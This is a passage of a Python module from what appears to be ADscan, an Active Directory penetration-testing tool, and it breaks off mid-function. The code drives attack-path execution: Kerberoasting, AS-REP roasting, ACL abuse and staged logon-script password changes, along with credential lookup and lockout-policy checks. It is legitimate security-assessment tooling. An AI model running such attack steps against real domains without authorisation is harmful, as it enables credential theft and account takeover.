"""Attack path execution UX helpers.

This module centralizes the interactive UX for:
- listing attack paths (already computed from `attack_graph.json`)
- letting the user inspect details
- optionally executing a selected path by mapping its steps to existing ADscan actions

The goal is to reuse this flow from multiple places (e.g. Phase 2 summary,
`ask_for_user_privs`, future phases) without duplicating prompt logic.
"""

from __future__ import annotations

from typing import Any, Callable
from contextlib import contextmanager
from datetime import UTC, datetime
import os
import re
import secrets
import shlex
import sys
import time

from rich.prompt import Confirm, Prompt
from rich.table import Table
from rich.text import Text

from adscan_internal import (
    print_error,
    print_exception,
    print_info,
    print_info_debug,
    print_info_verbose,
    print_warning,
    print_warning_debug,
    telemetry,
)
from adscan_internal.interaction import is_non_interactive
from adscan_internal.integrations.netexec.timeouts import (
    get_recommended_internal_timeout,
)
from adscan_internal.reporting_compat import load_optional_report_service_attr
from adscan_internal.passwords import generate_strong_password, is_password_complex
from adscan_internal.rich_output import (
    BRAND_COLORS,
    mark_sensitive,
    print_panel,
    print_system_change_warning,
    print_attack_path_detail,
    print_attack_paths_summary,
)
from adscan_internal.services.attack_graph_service import (
    infer_directory_object_enabled_state,
    get_node_by_label,
    get_attack_path_summaries,
    get_owned_domain_usernames_for_attack_paths,
    resolve_netexec_target_for_node_label,
    resolve_group_name_by_rid,
    resolve_group_user_members,
    update_edge_status_by_labels,
)
from adscan_internal.services.attack_graph_runtime_service import (
    clear_attack_path_execution,
    get_attack_path_followup_context,
    set_attack_path_step_context,
    set_attack_path_execution,
)
from adscan_internal.cli.roasting_execution import (
    run_asreproast_for_user,
    run_kerberoast_for_user,
)
from adscan_internal.cli.ace_step_execution import (
    ACL_ACE_RELATIONS,
    build_ace_step_context,
    describe_ace_relation_support,
    describe_ace_step_support,
    execute_ace_step,
    get_last_ace_execution_outcome,
    resolve_execution_user as _shared_resolve_execution_user,
)
from adscan_internal.cli.attack_step_followups import (
    build_followups_for_execution_outcome,
    build_followups_for_step,
    execute_guided_followup_actions,
)
from adscan_internal.services.attack_step_support_registry import (
    CONTEXT_ONLY_RELATIONS,
    POLICY_BLOCKED_RELATIONS,
    SUPPORTED_RELATION_NOTES,
    classify_relation_support,
)
from adscan_internal.services.ldap_transport_service import (
    prepare_kerberos_ldap_environment,
)
from adscan_internal.services.attack_step_catalog import (
    relation_counts_for_execution_readiness,
    relation_requires_execution_context,
    relation_requires_reachable_computer_target,
)
from adscan_internal.services.attack_path_cleanup_service import (
    begin_cleanup_scope,
    discard_cleanup_scope,
    execute_cleanup_scope,
    has_active_cleanup_scope,
    register_cleanup_from_outcome,
)
from adscan_internal.services.attack_path_target_viability_service import (
    assess_computer_target_viability,
)
from adscan_internal.services.pivot_opportunity_service import (
    ensure_host_bound_workflow_target_viable,
    maybe_offer_pivot_opportunity_for_host_viability,
)
from adscan_internal.services.logon_script_payload_service import (
    build_force_change_password_logon_script,
)
from adscan_internal.services.kerberos_ticket_service import KerberosTicketService
from adscan_internal.workspaces import domain_subpath, write_json_file


ATTACK_PATH_SNAPSHOT_FILENAME = "attack_paths_snapshot.json"


def _summary_target_priority_class(summary: dict[str, Any]) -> str:
    """Return the normalized target priority class for one path summary."""
    value = str(summary.get("target_priority_class") or "").strip().lower()
    if value in {"tierzero", "highvalue", "pivot"}:
        return value
    if bool(summary.get("is_tier_zero")):
        return "tierzero"
    if bool(summary.get("target_is_high_value")):
        return "highvalue"
    return "pivot"


def _sort_target_priority_groups(
    summaries: list[dict[str, Any]],
) -> list[dict[str, Any]]:
    """Return summaries grouped Tier-0 first, then high-value, then pivots."""
    ordered_classes = ("tierzero", "highvalue", "pivot")
    return [
        summary
        for priority_class in ordered_classes
        for summary in summaries
        if _summary_target_priority_class(summary) == priority_class
    ]


def _summary_search_mode_label(summary: dict[str, Any]) -> str:
    """Return the per-summary search-mode label used by execution UX."""
    priority_class = _summary_target_priority_class(summary)
    if priority_class == "tierzero":
        return "Tier-0 Search"
    if priority_class == "highvalue":
        return "High-Value Search"
    return "Pivot Search"


def _normalize_account(value: str) -> str:
    name = (value or "").strip()
    if "\\" in name:
        name = name.split("\\", 1)[1]
    if "@" in name:
        name = name.split("@", 1)[0]
    return name.strip().lower()


def _is_audit_mode(shell: Any) -> bool:
    """Return whether the current shell is running in audit mode."""
    return str(getattr(shell, "type", "") or "").strip().lower() == "audit"


def _get_stored_domain_credential_for_user(
    shell: Any, *, domain: str, username: str
) -> str | None:
    """Return stored credential for a domain user using case-insensitive lookup."""
    normalized_target = _normalize_account(username)
    if not normalized_target:
        return None
    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
    credentials = domain_data.get("credentials")
    if not isinstance(credentials, dict):
        return None
    for stored_user, stored_credential in credentials.items():
        if _normalize_account(str(stored_user)) != normalized_target:
            continue
        if not isinstance(stored_credential, str):
            return None
        candidate = stored_credential.strip()
        return candidate or None
    return None


def _env_flag_enabled(name: str) -> bool:
    """Return True when an environment flag is enabled."""
    return str(os.getenv(name, "")).strip().lower() in {
        "1",
        "true",
        "yes",
        "on",
    }


def _env_int(name: str, default: int, *, minimum: int = 0) -> int:
    """Read an integer env var with fallback and floor."""
    raw = str(os.getenv(name, str(default))).strip()
    try:
        value = int(raw)
    except (TypeError, ValueError):
        value = default
    return max(minimum, value)


def _is_adscan_managed_logon_script_path(path_value: str) -> bool:
    """Return whether one scriptPath value points to an ADscan-managed artifact."""
    basename = os.path.basename(str(path_value or "").replace("\\", "/")).strip().lower()
    return bool(basename) and basename.startswith("adscan-") and basename.endswith(".bat")


def _join_smb_path(directory_path: str, filename: str) -> str:
    """Join one SMB directory path and one filename using backslashes."""
    dir_clean = str(directory_path or "").strip().replace("/", "\\").strip("\\")
    file_clean = str(filename or "").strip().replace("/", "\\").strip("\\")
    if not dir_clean:
        return file_clean
    if not file_clean:
        return dir_clean
    return f"{dir_clean}\\{file_clean}"


def _get_pending_writelogonscript_manual_validations(shell: Any) -> list[dict[str, Any]]:
    """Return the mutable in-memory list of pending manual validations."""
    existing = getattr(shell, "_pending_writelogonscript_manual_validations", None)
    if isinstance(existing, list):
        return existing
    pending: list[dict[str, Any]] = []
    setattr(shell, "_pending_writelogonscript_manual_validations", pending)
    return pending


def _update_attack_path_step_status_at_index(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    step_index: int,
    status: str,
    notes: dict[str, Any] | None = None,
) -> None:
    """Update one summary step and its matching graph edge when labels are known."""
    steps = summary.get("steps")
    if not isinstance(steps, list):
        return
    if step_index < 0 or step_index >= len(steps):
        return
    step = steps[step_index]
    if not isinstance(step, dict):
        return

    merged_notes: dict[str, Any] = {}
    existing_details = step.get("details")
    if isinstance(existing_details, dict):
        merged_notes.update(existing_details)
    if isinstance(notes, dict):
        merged_notes.update(notes)

    step["status"] = status
    step["details"] = merged_notes

    action = str(step.get("action") or "").strip()
    from_label = str(merged_notes.get("from") or "").strip()
    to_label = str(merged_notes.get("to") or "").strip()
    if not action or not from_label or not to_label:
        return
    _update_attack_path_edge_status(
        shell,
        domain,
        from_label=from_label,
        relation=action,
        to_label=to_label,
        status=status,
        notes=merged_notes,
    )


def _update_attack_path_edge_status(
    shell: Any,
    domain: str,
    *,
    from_label: str,
    relation: str,
    to_label: str,
    status: str,
    notes: dict[str, Any] | None = None,
) -> bool:
    """Persist one attack-path edge status using the active-step updater when possible."""
    active = getattr(shell, "_active_attack_graph_step", None)
    active_domain = str(getattr(active, "domain", "") or "").strip()
    active_from = str(getattr(active, "from_label", "") or "").strip()
    active_relation = str(getattr(active, "relation", "") or "").strip()
    active_to = str(getattr(active, "to_label", "") or "").strip()
    updater = getattr(shell, "_update_active_attack_graph_step_status", None)
    if (
        callable(updater)
        and active_domain == str(domain or "").strip()
        and active_from == str(from_label or "").strip()
        and active_relation == str(relation or "").strip()
        and active_to == str(to_label or "").strip()
    ):
        return bool(updater(domain=domain, status=status, notes=notes))
    return bool(
        update_edge_status_by_labels(
            shell,
            domain,
            from_label=from_label,
            relation=relation,
            to_label=to_label,
            status=status,
            notes=notes,
        )
    )


def register_writelogonscript_manual_validation(
    shell: Any,
    *,
    domain: str,
    username: str,
    credential: str,
    summary: dict[str, Any],
    from_label: str,
    to_label: str,
) -> None:
    """Register one manual validation handoff for a staged WriteLogonScript step."""
    pending = _get_pending_writelogonscript_manual_validations(shell)
    entry = {
        "domain": str(domain or "").strip().lower(),
        "username": _normalize_account(username),
        "credential": str(credential or ""),
        "summary": summary,
        "from_label": str(from_label or ""),
        "to_label": str(to_label or ""),
        "registered_at": datetime.now(UTC).isoformat(),
    }
    pending[:] = [
        item
        for item in pending
        if not (
            str(item.get("domain") or "").strip().lower() == entry["domain"]
            and str(item.get("username") or "").strip() == entry["username"]
        )
    ]
    pending.append(entry)
    print_info_debug(
        "[writelogonscript] registered pending manual validation: "
        f"domain={mark_sensitive(entry['domain'], 'domain')} "
        f"user={mark_sensitive(entry['username'], 'user')}"
    )


def match_writelogonscript_manual_validation(
    shell: Any,
    *,
    domain: str,
    username: str,
    credential: str,
) -> dict[str, Any] | None:
    """Return one pending manual validation matching a manual credential save."""
    normalized_domain = str(domain or "").strip().lower()
    normalized_user = _normalize_account(username)
    raw_credential = str(credential or "")
    for item in _get_pending_writelogonscript_manual_validations(shell):
        if str(item.get("domain") or "").strip().lower() != normalized_domain:
            continue
        if str(item.get("username") or "").strip() != normalized_user:
            continue
        if str(item.get("credential") or "") != raw_credential:
            continue
        return item
    return None


def clear_writelogonscript_manual_validation(
    shell: Any,
    *,
    domain: str,
    username: str,
    credential: str,
) -> None:
    """Clear one consumed pending manual validation entry."""
    normalized_domain = str(domain or "").strip().lower()
    normalized_user = _normalize_account(username)
    raw_credential = str(credential or "")
    pending = _get_pending_writelogonscript_manual_validations(shell)
    pending[:] = [
        item
        for item in pending
        if not (
            str(item.get("domain") or "").strip().lower() == normalized_domain
            and str(item.get("username") or "").strip() == normalized_user
            and str(item.get("credential") or "") == raw_credential
        )
    ]


def _get_writelogonscript_lockout_policy_state(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> dict[str, Any]:
    """Return whether automatic post-stage validation is safe for this domain."""
    try:
        from adscan_internal.cli.spraying import _run_netexec_query_with_parse_retry
        from adscan_internal.spraying import (
            build_netexec_pass_pol_command,
            parse_netexec_lockout_threshold_result,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        return {
            "policy_known": False,
            "auto_validation_safe": False,
            "lockout_threshold": None,
            "explicit_none": False,
            "error": str(exc),
        }

    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
    pdc_ip = str(domain_data.get("pdc") or "").strip()
    netexec_path = str(getattr(shell, "netexec_path", "") or "").strip()
    if not pdc_ip or not netexec_path or not username or not password:
        return {
            "policy_known": False,
            "auto_validation_safe": False,
            "lockout_threshold": None,
            "explicit_none": False,
            "error": "Missing NetExec path, PDC, or authenticated credential for pass-pol query.",
        }

    command = build_netexec_pass_pol_command(
        nxc_path=netexec_path,
        dc_ip=pdc_ip,
        username=username,
        password=password,
        domain=domain,
        kerberos=True,
    )
    print_info_debug(f"[writelogonscript pass-pol] {command}")
    proc = _run_netexec_query_with_parse_retry(
        shell,
        command=command,
        domain=domain,
        query_label="NetExec --pass-pol",
        parse_ok=lambda output: (
            parse_netexec_lockout_threshold_result(output).explicit_none
            or parse_netexec_lockout_threshold_result(output).threshold is not None
        ),
    )
    stdout = str(getattr(proc, "stdout", "") or "")
    if not stdout:
        return {
            "policy_known": False,
            "auto_validation_safe": False,
            "lockout_threshold": None,
            "explicit_none": False,
            "error": "Password policy query returned no parseable output.",
        }

    threshold_result = parse_netexec_lockout_threshold_result(stdout)
    if threshold_result.explicit_none:
        return {
            "policy_known": True,
            "auto_validation_safe": True,
            "lockout_threshold": None,
            "explicit_none": True,
            "error": "",
        }
    if threshold_result.threshold == 0:
        return {
            "policy_known": True,
            "auto_validation_safe": True,
            "lockout_threshold": 0,
            "explicit_none": False,
            "error": "",
        }
    if threshold_result.threshold is not None:
        return {
            "policy_known": True,
            "auto_validation_safe": False,
            "lockout_threshold": int(threshold_result.threshold),
            "explicit_none": False,
            "error": "",
        }
    return {
        "policy_known": False,
        "auto_validation_safe": False,
        "lockout_threshold": None,
        "explicit_none": False,
        "error": "Password policy output did not expose a parseable lockout threshold.",
    }


def _render_writelogonscript_manual_validation_panel(
    *,
    domain: str,
    target_user: str,
    credential: str,
    policy_state: dict[str, Any],
) -> None:
    """Render operator guidance when auto-validation is unsafe."""
    marked_domain = mark_sensitive(domain, "domain")
    marked_user = mark_sensitive(target_user, "user")
    lockout_threshold = policy_state.get("lockout_threshold")
    if policy_state.get("explicit_none"):
        threshold_label = "None"
    elif lockout_threshold is None:
        threshold_label = "Unknown"
    else:
        threshold_label = str(lockout_threshold)
    message = Text()
    message.append(
        "Automatic WriteLogonScript credential validation was skipped.\n",
        style="bold yellow",
    )
    message.append(
        f"Target user: {marked_user}\n"
        f"Domain: {marked_domain}\n"
        f"Account lockout threshold: {mark_sensitive(threshold_label, 'text')}\n\n",
        style="bold",
    )
    message.append("Why ADscan stopped here:\n", style="bold")
    message.append(
        " - Automatic LDAP polling would repeatedly test the staged password.\n"
        " - In a domain with lockout enforcement, those retries could lock the account.\n\n",
        style="dim",
    )
    message.append("Recommended next step:\n", style="bold")
    message.append(
        " - Wait for the target user to log on and trigger the script.\n"
        " - Validate the new credential manually and carefully, using as few attempts as possible.\n"
        " - Once confirmed, save it in ADscan with:\n",
        style="dim",
    )
    message.append(
        f"   creds save {domain} {target_user} {credential}\n\n",
        style="bold cyan",
    )
    message.append(
        "When you save that exact credential in this session, ADscan will trust the manual validation "
        "and attempt the pending WriteLogonScript cleanup automatically.",
        style="dim",
    )
    print_panel(
        message,
        title=Text("Manual Validation Required", style="bold yellow"),
        border_style="yellow",
        expand=False,
    )


def persist_attack_path_snapshot(
    shell: Any,
    domain: str,
    *,
    summaries: list[dict[str, Any]] | None,
    scope: str,
    target: str,
    target_mode: str,
    search_mode_label: str | None = None,
) -> None:
    """Persist the latest CLI-computed attack-path summaries for web consumption.

    This is best-effort only and must never affect the existing CLI flow.
    """
    if not summaries:
        return

    try:
        workspace_cwd = (
            shell._get_workspace_cwd()
            if hasattr(shell, "_get_workspace_cwd")
            else getattr(shell, "current_workspace_dir", os.getcwd())
        )
        output_path = domain_subpath(
            workspace_cwd,
            shell.domains_dir,
            domain,
            ATTACK_PATH_SNAPSHOT_FILENAME,
        )
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        snapshot_paths: list[dict[str, Any]] = []
        for index, summary in enumerate(summaries, start=1):
            if not isinstance(summary, dict):
                continue
            nodes = summary.get("nodes") if isinstance(summary.get("nodes"), list) else []
            relations = (
                summary.get("relations")
                if isinstance(summary.get("relations"), list)
                else []
            )
            steps = summary.get("steps") if isinstance(summary.get("steps"), list) else []
            snapshot_paths.append(
                {
                    "id": str(summary.get("id") or f"{scope}:{index}:{summary.get('source')}->{summary.get('target')}"),
                    "index": index,
                    "source": str(summary.get("source") or ""),
                    "target": str(summary.get("target") or ""),
                    "length": int(summary.get("length") or 0),
                    "status": str(summary.get("status") or "theoretical"),
                    "is_high_value": bool(summary.get("target_is_high_value")),
                    "is_tier_zero": _summary_target_priority_class(summary) == "tierzero",
                    "target_priority_class": _summary_target_priority_class(summary),
                    "nodes": [str(node or "") for node in nodes],
                    "relations": [str(relation or "") for relation in relations],
                    "steps": steps,
                }
            )

        payload = {
            "schema_version": "1.0",
            "generated_at": datetime.now(UTC).isoformat(),
            "domain": domain,
            "scope": scope,
            "target": target,
            "target_mode": target_mode,
            "search_mode_label": search_mode_label,
            "path_count": len(snapshot_paths),
            "paths": snapshot_paths,
        }
        write_json_file(output_path, payload)
        print_info_debug(
            "[attack_paths] snapshot persisted: "
            f"domain={mark_sensitive(domain, 'domain')} "
            f"scope={scope} count={len(snapshot_paths)}"
        )
    except Exception as exc:  # pragma: no cover - best effort only
        telemetry.capture_exception(exc)
        print_info_debug(f"[attack_paths] snapshot persistence failed: {exc}")


def _attack_path_event_id(summary: dict[str, Any]) -> str:
    """Return a stable best-effort identifier for one attack path summary."""
    path_id = str(summary.get("id") or "").strip()
    if path_id:
        return path_id
    source = str(summary.get("source") or "unknown-source").strip()
    target = str(summary.get("target") or "unknown-target").strip()
    length = int(summary.get("length") or 0)
    return f"{source}->{target}:{length}"


def _count_executable_steps(
    steps: list[dict[str, Any]],
    *,
    non_executable_actions: set[str],
    dangerous_actions: set[str],
) -> int:
    """Return the number of executable steps in one path summary."""
    total = 0
    for step in steps:
        if not isinstance(step, dict):
            continue
        action = str(step.get("action") or "").strip().lower()
        if not action:
            continue
        if action in non_executable_actions or action in dangerous_actions:
            continue
        total += 1
    return total


def _record_attack_path_execution_event(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    event_stage: str,
    message: str,
    step_index: int | None = None,
    total_steps: int | None = None,
    executable_step_index: int | None = None,
    last_executable_idx: int | None = None,
    action: str | None = None,
    from_label: str | None = None,
    to_label: str | None = None,
    step_status: str | None = None,
    reason: str | None = None,
    actor: str | None = None,
    target_host: str | None = None,
    search_mode_label: str | None = None,
) -> None:
    """Persist one structured attack-path execution event for web/live consumers.

    This is best-effort only and must never alter the existing CLI execution flow.
    """
    record_technical_event = load_optional_report_service_attr(
        "record_technical_event",
        action="Technical event sync",
        debug_printer=print_info_debug,
        prefix="[attack_paths]",
        module_name="adscan_internal.pro.services.report_service",
    )
    if not callable(record_technical_event):
        return

    try:
        details = {
            "source": "attack_path_execution",
            "event_stage": str(event_stage or "").strip(),
            "path_id": _attack_path_event_id(summary),
            "path_source": str(summary.get("source") or "").strip(),
            "path_target": str(summary.get("target") or "").strip(),
            "path_length": int(summary.get("length") or 0),
            "path_status": str(summary.get("status") or "theoretical").strip(),
            "is_high_value": bool(summary.get("target_is_high_value")),
            "is_tier_zero": _summary_target_priority_class(summary) == "tierzero",
            "target_priority_class": _summary_target_priority_class(summary),
            "step_index": int(step_index) if step_index is not None else None,
            "total_steps": int(total_steps) if total_steps is not None else None,
            "executable_step_index": (
                int(executable_step_index)
                if executable_step_index is not None
                else None
            ),
            "last_executable_idx": (
                int(last_executable_idx)
                if last_executable_idx is not None
                else None
            ),
            "action": str(action or "").strip() or None,
            "from": str(from_label or "").strip() or None,
            "to": str(to_label or "").strip() or None,
            "step_status": str(step_status or "").strip() or None,
            "reason": str(reason or "").strip() or None,
            "actor": str(actor or "").strip() or None,
            "target_host": str(target_host or "").strip() or None,
            "search_mode_label": str(search_mode_label or "").strip() or None,
        }
        details = {key: value for key, value in details.items() if value not in {None, ""}}
        record_technical_event(
            shell,
            domain,
            event_type="attack_path_execution",
            message=message,
            details=details,
        )
    except Exception as exc:  # pragma: no cover - best effort only
        telemetry.capture_exception(exc)
        print_info_debug(f"[attack_paths] execution event persistence failed: {exc}")


_AUTO_REFRESH_AFFECTED_USERS_THRESHOLD = _env_int(
    "ADSCAN_ATTACK_PATH_AUTO_REFRESH_MAX_AFFECTED_USERS",
    150,
    minimum=0,
)

def _affected_user_count(summary: dict[str, Any]) -> int:
    """Return affected principal count (users + computers) from summary metadata.

    Returns ``affected_principal_count`` when present (set by
    ``apply_affected_user_metadata`` and covers both user and computer members).
    Falls back to ``affected_user_count`` for older cached records that pre-date
    computer-group support, and finally to the length of ``affected_users``.
    """
    meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
    if not isinstance(meta, dict):
        return 0
    principal_count = meta.get("affected_principal_count")
    if isinstance(principal_count, int) and principal_count >= 0:
        return principal_count
    count = meta.get("affected_user_count")
    if isinstance(count, int) and count >= 0:
        return count
    users = meta.get("affected_users")
    if isinstance(users, list):
        return len(users)
    return 0


def _get_stored_credential_map(shell: Any, domain: str) -> dict[str, str]:
    """Return stored domain credentials indexed by normalized username."""
    domains_data = getattr(shell, "domains_data", None)
    if not isinstance(domains_data, dict):
        return {}
    domain_data = domains_data.get(domain)
    if not isinstance(domain_data, dict):
        return {}
    creds = domain_data.get("credentials")
    if not isinstance(creds, dict):
        return {}
    normalized: dict[str, str] = {}
    for username in creds.keys():
        normalized_username = _normalize_account(str(username or ""))
        if not normalized_username:
            continue
        normalized[normalized_username] = str(username)
    return normalized


def _first_execution_readiness_step(summary: dict[str, Any]) -> tuple[str, dict[str, Any]] | None:
    """Return the first path step that gates whether execution can start."""
    steps = summary.get("steps")
    if not isinstance(steps, list):
        return None
    for step in steps:
        if not isinstance(step, dict):
            continue
        action = str(step.get("action") or "").strip().lower()
        if relation_counts_for_execution_readiness(action):
            details = step.get("details")
            if isinstance(details, dict):
                return action, details
    return None


def _execution_readiness_meta(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    context_username: str | None,
    context_password: str | None,
) -> dict[str, Any]:
    """Estimate whether a path has usable execution credential context."""
    step_info = _first_execution_readiness_step(summary)
    if step_info is None:
        return {}

    action, details = step_info
    from_label = str(details.get("from") or "")
    to_label = str(details.get("to") or "")
    stored_creds = _get_stored_credential_map(shell, domain)

    if action == "asreproasting":
        return {
            "execution_context_required": False,
            "execution_support_status": "supported",
            "execution_support_target_kind": "",
            "execution_target_enabled": None,
            "execution_target_enabled_source": "unknown",
            "execution_ready_count": 1,
            "execution_candidate_count": 1,
            "execution_candidate_source": "asreproasting_no_auth_required",
            "execution_readiness_reason": "asreproasting_no_auth_required",
            "execution_context_action": action,
        }

    if action == "kerberoasting":
        normalized_context_user = _normalize_account(context_username or "")
        if normalized_context_user:
            ready = bool(
                context_password
                or _resolve_domain_password(shell, domain, normalized_context_user)
            )
            return {
                "execution_context_required": True,
                "execution_support_status": "supported",
                "execution_support_target_kind": "",
                "execution_target_enabled": None,
                "execution_target_enabled_source": "unknown",
                "execution_ready_count": 1 if ready else 0,
                "execution_candidate_count": 1,
                "execution_candidate_source": "context_username",
                "execution_readiness_reason": (
                    "context_username"
                    if ready
                    else "context_username_missing_credential"
                ),
                "execution_context_action": action,
            }
        if stored_creds:
            return {
                "execution_context_required": True,
                "execution_support_status": "supported",
                "execution_support_target_kind": "",
                "execution_target_enabled": None,
                "execution_target_enabled_source": "unknown",
                "execution_ready_count": len(stored_creds),
                "execution_candidate_count": len(stored_creds),
                "execution_candidate_source": "all_stored_credentials_fallback",
                "execution_readiness_reason": "all_stored_credentials_fallback",
                "execution_context_action": action,
            }
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": "",
            "execution_target_enabled": None,
            "execution_target_enabled_source": "unknown",
            "execution_ready_count": 0,
            "execution_candidate_count": 0,
            "execution_candidate_source": "unresolved",
            "execution_readiness_reason": "no_stored_credentials_available",
            "execution_context_action": action,
        }

    if not relation_requires_execution_context(action):
        return {
            "execution_context_required": False,
            "execution_support_status": "supported",
            "execution_support_target_kind": "",
            "execution_target_enabled": None,
            "execution_target_enabled_source": "unknown",
            "execution_ready_count": 1,
            "execution_candidate_count": 1,
            "execution_candidate_source": "catalog_no_context_required",
            "execution_readiness_reason": "catalog_no_context_required",
            "execution_context_action": action,
        }

    target_kind = ""
    target_enabled: bool | None = None
    target_enabled_source = "unknown"
    target_viability_status = ""
    target_viability_summary = ""
    target_viability_reason = ""
    target_reachable: bool | None = None
    target_reachable_source = "unknown"
    target_resolved: bool | None = None
    target_matched_ips: tuple[str, ...] = ()
    target_vantage_mode = ""
    target_execution_advisory = ""
    target_access_requirement = (
        "computer_reachable"
        if relation_requires_reachable_computer_target(action)
        else "none"
    )
    to_node: dict[str, Any] | None = None
    if to_label:
        to_node = get_node_by_label(shell, domain, label=to_label)
        if isinstance(to_node, dict):
            kind = to_node.get("kind") or to_node.get("labels") or to_node.get("type")
            if isinstance(kind, list) and kind:
                target_kind = str(kind[0])
            elif isinstance(kind, str):
                target_kind = kind
            target_enabled, target_enabled_source = infer_directory_object_enabled_state(
                shell,
                domain=domain,
                principal_name=to_label,
                principal_kind=target_kind,
                node=to_node,
            )
            if str(target_kind or "").strip().lower() == "computer":
                target_viability = assess_computer_target_viability(
                    shell,
                    domain=domain,
                    principal_name=to_label,
                    node=to_node,
                )
                target_viability_status = target_viability.status
                target_viability_summary = target_viability.operator_summary
                target_viability_reason = target_viability.debug_reason
                target_reachable = target_viability.reachable_from_current_vantage
                target_reachable_source = (
                    "current_vantage_reachability_report"
                    if target_viability.reachable_from_current_vantage is not None
                    else "unknown"
                )
                target_resolved = target_viability.resolved_in_current_vantage_inventory
                target_matched_ips = tuple(target_viability.matched_ips)
                target_vantage_mode = str(target_viability.vantage_mode or "")
                target_execution_advisory = str(
                    target_viability.execution_advisory or ""
                )
    if action in ACL_ACE_RELATIONS and to_label:
        supported, support_reason = describe_ace_relation_support(action, target_kind)
        if not supported:
            return {
                "execution_context_required": True,
                "execution_support_status": "unsupported",
                "execution_support_reason": support_reason or "Unsupported target type",
                "execution_support_target_kind": target_kind or "Unknown",
                "execution_target_enabled": target_enabled,
                "execution_target_enabled_source": target_enabled_source,
                "execution_target_viability_status": target_viability_status,
                "execution_target_viability_summary": target_viability_summary,
                "execution_target_viability_reason": target_viability_reason,
                "execution_target_reachable": target_reachable,
                "execution_target_reachable_source": target_reachable_source,
                "execution_target_resolved": target_resolved,
                "execution_target_matched_ips": list(target_matched_ips),
                "execution_target_vantage_mode": target_vantage_mode,
                "execution_target_execution_advisory": target_execution_advisory,
                "execution_target_access_requirement": target_access_requirement,
                "execution_target_label": to_label,
                "execution_ready_count": 0,
                "execution_candidate_count": 0,
                "execution_candidate_source": "unsupported",
                "execution_readiness_reason": "unsupported_target_type",
                "execution_context_action": action,
            }

    if (
        target_access_requirement == "computer_reachable"
        and str(target_kind or "").strip().lower() == "computer"
    ):
        blocked_reason = ""
        support_reason = ""
        if target_enabled is False:
            blocked_reason = "target_computer_disabled"
            support_reason = (
                "Host-bound execution is blocked because the target computer is disabled."
            )
        elif target_viability_status == "resolved_but_unreachable":
            blocked_reason = "target_computer_unreachable_from_current_vantage"
            support_reason = (
                "Host-bound execution is blocked because the target computer is unreachable "
                "from the current vantage."
            )
        elif target_viability_status == "enabled_but_unresolved":
            blocked_reason = "target_computer_enabled_but_unresolved"
            support_reason = (
                "Host-bound execution is blocked because the target computer is enabled in AD "
                "but has no resolvable current-vantage target."
            )
        elif target_viability_status == "not_in_enabled_inventory":
            blocked_reason = "target_computer_not_in_enabled_inventory"
            support_reason = (
                "Host-bound execution is blocked because the target computer is not present in "
                "the enabled-computer inventory."
            )
        if blocked_reason:
            return {
                "execution_context_required": True,
                "execution_support_status": "blocked",
                "execution_support_reason": support_reason,
                "execution_support_target_kind": target_kind or "Unknown",
                "execution_target_enabled": target_enabled,
                "execution_target_enabled_source": target_enabled_source,
                "execution_target_viability_status": target_viability_status,
                "execution_target_viability_summary": target_viability_summary,
                "execution_target_viability_reason": target_viability_reason,
                "execution_target_reachable": target_reachable,
                "execution_target_reachable_source": target_reachable_source,
                "execution_target_resolved": target_resolved,
                "execution_target_matched_ips": list(target_matched_ips),
                "execution_target_vantage_mode": target_vantage_mode,
                "execution_target_execution_advisory": target_execution_advisory,
                "execution_target_access_requirement": target_access_requirement,
                "execution_target_label": to_label,
                "execution_ready_count": 0,
                "execution_candidate_count": 0,
                "execution_candidate_source": "blocked",
                "execution_readiness_reason": blocked_reason,
                "execution_context_action": action,
            }

    normalized_context_user = _normalize_account(context_username or "")
    if normalized_context_user:
        ready = bool(
            context_password
            or _resolve_domain_password(shell, domain, normalized_context_user)
        )
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": target_kind or "",
            "execution_target_enabled": target_enabled,
            "execution_target_enabled_source": target_enabled_source,
            "execution_target_viability_status": target_viability_status,
            "execution_target_viability_summary": target_viability_summary,
            "execution_target_viability_reason": target_viability_reason,
            "execution_target_reachable": target_reachable,
            "execution_target_reachable_source": target_reachable_source,
            "execution_target_resolved": target_resolved,
            "execution_target_matched_ips": list(target_matched_ips),
            "execution_target_vantage_mode": target_vantage_mode,
            "execution_target_execution_advisory": target_execution_advisory,
            "execution_target_access_requirement": target_access_requirement,
            "execution_target_label": to_label,
            "execution_ready_count": 1 if ready else 0,
            "execution_candidate_count": 1,
            "execution_candidate_source": "context_username",
            "execution_readiness_reason": (
                "context_username"
                if ready
                else "context_username_missing_credential"
            ),
            "execution_context_action": action,
        }

    normalized_from_user = _normalize_account(from_label)
    from_node = get_node_by_label(shell, domain, label=from_label) if from_label else None
    from_kind = ""
    if isinstance(from_node, dict):
        kind = from_node.get("kind") or from_node.get("labels") or from_node.get("type")
        if isinstance(kind, list) and kind:
            from_kind = str(kind[0])
        elif isinstance(kind, str):
            from_kind = kind
    if normalized_from_user and normalized_from_user in stored_creds:
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": target_kind or "",
            "execution_target_enabled": target_enabled,
            "execution_target_enabled_source": target_enabled_source,
            "execution_target_viability_status": target_viability_status,
            "execution_target_viability_summary": target_viability_summary,
            "execution_target_viability_reason": target_viability_reason,
            "execution_target_reachable": target_reachable,
            "execution_target_reachable_source": target_reachable_source,
            "execution_target_resolved": target_resolved,
            "execution_target_matched_ips": list(target_matched_ips),
            "execution_target_vantage_mode": target_vantage_mode,
            "execution_target_execution_advisory": target_execution_advisory,
            "execution_ready_count": 1,
            "execution_candidate_count": 1,
            "execution_candidate_source": "from_label_credential",
            "execution_readiness_reason": "from_label_credential",
            "execution_context_action": action,
        }
    if normalized_from_user and from_kind.strip().lower() == "user":
        return {
            "execution_context_required": True,
            "execution_support_status": "supported",
            "execution_support_target_kind": target_kind or "",
            "execution_target_enabled": target_enabled,
            "execution_target_enabled_source": target_enabled_source,
            "execution_target_viability_status": target_viability_status,
            "execution_target_viability_summary": target_viability_summary,
            "execution_target_viability_reason": target_viability_reason,
            "execution_target_reachable": target_reachable,
